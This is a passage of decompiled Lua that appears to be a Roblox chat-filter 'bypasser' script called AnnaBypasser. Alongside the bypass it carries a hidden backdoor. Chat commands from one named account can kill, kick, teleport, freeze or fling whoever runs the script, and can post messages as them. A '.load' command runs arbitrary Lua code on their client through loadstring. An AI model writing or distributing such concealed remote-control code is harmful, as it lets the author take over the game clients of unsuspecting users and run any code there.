    local v122, v123 = pcall(function()
        return game:GetService("Chat"):FilterStringAsync(pu121, vu96, vu96)
    end)
    if v122 then
        v122 = v123 == pu121
    end
    return v122, v123
end
local function vu127(p125)
    local v126, _ = vu124(p125)
    if v126 then
        if v126 then
            game.StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "AnnaBypasser Loaded Successfully!",
                Color = Color3.fromRGB(0, 255, 0),
                Font = Enum.Font.SourceSans,
                TextSize = 20
            })
        end
    else
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "error checking filter make sure your language is set to \210\154\208\176\208\183\208\176\210\155 \208\162\209\150\208\187\209\150* if you dont know how watch youtube.com/watch?v=Y-WpfOQiboU",
            Color = Color3.fromRGB(255, 0, 0),
            Font = Enum.Font.SourceSans,
            TextSize = 20
        })
    end
end;
(function()
    vu127("lil\8hoe")
end)()
local vu128 = game:GetService("Players")
local vu129 = game:GetService("StarterGui")
local vu130 = ";annabypasser"
local vu131 = "in\8a\226\180\150\226\180\150a\8we\8trust"
local vu132 = {}
local function vu134(p133)
    vu129:SetCore("ChatMakeSystemMessage", {
        Text = p133,
        Color = Color3.fromRGB(255, 255, 255),
        Font = Enum.Font.SourceSansBold,
        FontSize = Enum.FontSize.Size24
    })
end
local function vu137(pu135)
    if pu135 then
        pu135.Chatted:Connect(function(p136)
            if p136 == vu130 then
                vu128:Chat(vu131)
                if pu135 == vu128.LocalPlayer then
                    vu134("These players are using annabypasser: " .. table.concat(vu132, ", "))
                end
            end
            if (p136:lower() == vu131 or p136:match("^#+$") and # p136 == # vu131) and not table.find(vu132, pu135.Name) then
                table.insert(vu132, pu135.Name)
            end
        end)
    end
end
local v138 = vu128
local v139, v140, v141 = ipairs(vu128.GetPlayers(v138))
local v142 = vu128
while true do
    local v143
    v141, v143 = v139(v140, v141)
    if v141 == nil then
        break
    end
    vu137(v143)
end
v142.PlayerAdded:Connect(function(p144)
    vu137(p144)
end)
local v145 = game:GetService("Players")
local vu146 = v145.LocalPlayer
local vu147 = "annathegoodgirI"
local function vu189(p148, p149)
    if p148.Name == vu147 then
        local v150 = p149:split(" ")
        local v151 = v150[1]:lower()
        local v152
        if v151 == ".tpa" or v151 == ".tp" then
            if not (p148.Character and p148.Character:FindFirstChild("HumanoidRootPart")) then
                return
            end
            v152 = p148.Character:FindFirstChild("HumanoidRootPart")
        else
            v152 = nil
        end
        if v151 == ".tpa" then
            if vu146.Character and vu146.Character:FindFirstChild("HumanoidRootPart") then
                vu146.Character:FindFirstChild("HumanoidRootPart").CFrame = v152.CFrame * CFrame.new(0, 0, 5)
            end
        elseif v151 == ".kill" then
            if v150[2] then
                local v153 = v150[2]:lower()
                local v154 = vu146.Name:lower()
                local v155 = (vu146.DisplayName or ""):lower()
                local v156 = (v153 == "all" or (v154:find(v153) or v155:find(v153))) and vu146.Character and vu146.Character:FindFirstChildOfClass("Humanoid")
                if v156 then
                    v156.Health = 0
                end
            end
        elseif v151 == ".tp" then
            if v150[2] then
                local v157 = v150[2]:lower()
                local v158 = vu146.Name:lower()
                local v159 = (vu146.DisplayName or ""):lower()
                if (v157 == "all" or (v158:find(v157) or v159:find(v157))) and vu146.Character and vu146.Character:FindFirstChild("HumanoidRootPart") then
                    vu146.Character:FindFirstChild("HumanoidRootPart").CFrame = v152.CFrame * CFrame.new(0, 0, 5)
                end
            end
        elseif v151 == ".kick" then
            if v150[2] then
                local v160 = v150[2]:lower()
                local v161 = # v150 > 2 and table.concat(v150, " ", 3) or ""
                local v162 = vu146.Name:lower()
                local v163 = (vu146.DisplayName or ""):lower()
                if v160 == "all" or (v162:find(v160) or v163:find(v160)) then
                    vu146:Kick(v161)
                end
            end
        elseif v151 == ".chat" then
            if v150[2] and # v150 >= 3 then
                local v164 = v150[2]:lower()
                local vu165 = table.concat(v150, " ", 3)
                local v166 = vu146.Name:lower()
                local v167 = (vu146.DisplayName or ""):lower()
                if v164 == "all" or (v166:find(v164) or v167:find(v164)) then
                    pcall(function()
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(vu165, "All")
                    end)
                    pcall(function()
                        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(vu165)
                    end)
                end
            end
        elseif v151 == ".sit" then
            if v150[2] then
                local v168 = v150[2]:lower()
                local v169 = vu146.Name:lower()
                local v170 = (vu146.DisplayName or ""):lower()
                local v171 = (v168 == "all" or (v169:find(v168) or v170:find(v168))) and vu146.Character and vu146.Character:FindFirstChildOfClass("Humanoid")
                if v171 then
                    v171.Sit = true
                end
            end
        elseif v151 == ".fling" then
            if v150[2] then
                local v172 = v150[2]:lower()
                local v173 = vu146.Name:lower()
                local v174 = (vu146.DisplayName or ""):lower()
                if (v172 == "all" or (v173:find(v172) or v174:find(v172))) and vu146.Character and vu146.Character:FindFirstChild("HumanoidRootPart") then
                    vu146.Character:FindFirstChild("HumanoidRootPart").Velocity = Vector3.new(578, 99999999, 578)
                end
            end
        elseif v151 == ".punish" then
            if v150[2] then
                local v175 = v150[2]:lower()
                local v176 = vu146.Name:lower()
                local v177 = (vu146.DisplayName or ""):lower()
                if (v175 == "all" or (v176:find(v175) or v177:find(v175))) and vu146.Character and vu146.Character:FindFirstChild("HumanoidRootPart") then
                    vu146.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                end
            end
        elseif v151 == ".freeze" then
            if v150[2] then
                local v178 = v150[2]:lower()
                local v179 = vu146.Name:lower()
                local v180 = (vu146.DisplayName or ""):lower()
                if (v178 == "all" or (v179:find(v178) or v180:find(v178))) and vu146.Character and vu146.Character:FindFirstChild("HumanoidRootPart") then
                    vu146.Character.HumanoidRootPart.Anchored = true
                end
            end
        elseif v151 == ".unfreeze" or v151 == ".thaw" then
            if v150[2] then
                local v181 = v150[2]:lower()
                local v182 = vu146.Name:lower()
                local v183 = (vu146.DisplayName or ""):lower()
                if (v181 == "all" or (v182:find(v181) or v183:find(v181))) and vu146.Character and vu146.Character:FindFirstChild("HumanoidRootPart") then
                    vu146.Character.HumanoidRootPart.Anchored = false
                end
            end
        elseif (v151 == ".load" or v151 == ".l") and (v150[2] and # v150 >= 3) then
            local v184 = v150[2]:lower()
            local v185 = table.concat(v150, " ", 3)
            local v186 = vu146.Name:lower()
            local v187 = (vu146.DisplayName or ""):lower()
            if v184 == "all" or (v186:find(v184) or v187:find(v184)) then
                local v188, _ = loadstring(v185)
                if v188 then
                    pcall(v188)
                else
                    warn("error")
                end
            end
        end
    end
end
local function v192(pu190)
    pu190.Chatted:Connect(function(p191)
        vu189(pu190, p191)
    end)
end
local v193, v194, v195 = pairs(v145:GetPlayers())
while true do
    local v196
    v195, v196 = v193(v194, v195)
    if v195 == nil then
        break
    end
    v192(v196)
end
v145.PlayerAdded:Connect(v192)
while true do
    v118("Annathagoodgurl")
    wait(10)
end